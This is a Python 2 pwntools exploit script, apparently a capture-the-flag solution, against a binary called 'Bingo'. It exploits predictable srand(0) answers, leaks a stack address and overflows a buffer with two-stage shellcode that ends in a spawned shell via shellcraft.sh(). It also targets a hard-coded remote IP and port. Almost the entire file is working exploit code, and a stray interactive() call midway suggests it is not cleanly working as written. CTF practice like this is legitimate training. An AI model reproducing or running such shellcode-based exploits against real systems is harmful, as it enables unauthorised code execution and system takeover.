# -*- coding: utf-8 -*-
from pwn import *
import sys,time
context.arch = 'amd64'

print sys.argv
if len(sys.argv) == 2 and sys.argv[1] == 'remote':
    r = remote('35.201.132.60', 12001)
else:
    r = remote('localhost',8888)
    #r = process('./Bingo', env={'LD_PRELOAD':'./libc.so.6'})

#由於srand(0)的關係 所以每次輸入是固定的
answers = [183, 86, 177, 115, 193, 135, 186, 92, 49, 21, 162, 27, 90, 59, 163, 'aaaa']


r.recvuntil('please input your numbers:')
r.interactive()
#answer
for ans in answers:
    if type(ans) == int:
        r.sendline(str(ans))
    else:
        r.send(ans)

r.recvuntil('aaaa')
info = r.recvline().strip()
buf = u64(info.ljust(8,'\0')) - 0x14
print hex(buf)#0x7ffd8ab022c0 0x7ffd8ab022ac

#此時可以觸發bof漏洞 控制rip
r.recvuntil('Winner can leave message for others:')
#
shellcode_1  = """
    shl rdx, 0x2
    add rsi, 0x8
    syscall
    jmp rsi
"""
data = asm(shellcode_1)
print len(data)
print len(p64(buf))
print hex(u32(data[:4])), hex(u64(data[4:])), hex(buf)

data = data + p64(buf)
data = data[:data.find('\0')]
#data = 'x'*12 + p64(buf)
print len(data)
r.sendline(data)

shellcode_2 = shellcraft.sh()
data = asm(shellcode_2)
r.send(data)
r.interactive()
